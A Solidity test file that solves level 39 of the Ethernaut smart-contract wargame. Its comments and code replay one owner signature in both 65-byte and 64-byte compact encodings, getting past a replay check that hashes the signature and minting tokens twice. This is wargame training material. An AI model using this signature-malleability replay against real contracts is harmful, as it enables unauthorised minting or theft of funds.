// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level39 {
    function createNewTokensFromOwnerSignature(bytes calldata, address, uint256, bytes32, uint256) external;
}

contract Level39Test is EthernautTest {
    function testLevel39() public {
        _createLevel("39");

        Level39 level39Instance = Level39(levelInstance["39"]);

        // This level is relatively simple.
        // The contract hashes the signature in an attempt to prevent signature re-use.
        // While the OZ library prevents the twin signature (r,n-s).
        // It does not prevent re-use of the same sigature with different encoding.
        // (r,s,v) and (r,vs) will be acceptable.

        // This signature is f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c
        // So lets define the parts
        uint256 r = 0xf73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809;
        uint256 s = 0x402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb;
        uint8 v = 28;

        // We can then use both signatures to mint 200 tokens.

        // This is the 65 byte encoding.
        bytes memory signature_one = abi.encodePacked(r, s, v);
        // This is the 64 byte encoding.
        bytes memory signature_two = abi.encodePacked(r, s | (uint256(v % 27) << 255));

        // Using the other parameters, we only need to increase the supply.
        // (No requirement the tokens are sent to us.)

        address receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
        uint256 amount = 100 ether;
        bytes32 salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
        uint256 deadline = 115792089237316195423570985008687907853269984665640564039457584007913129639935;

        level39Instance.createNewTokensFromOwnerSignature(signature_one, receiver, amount, salt, deadline);
        level39Instance.createNewTokensFromOwnerSignature(signature_two, receiver, amount, salt, deadline);

        require(_submitLevel("39"));
    }
}
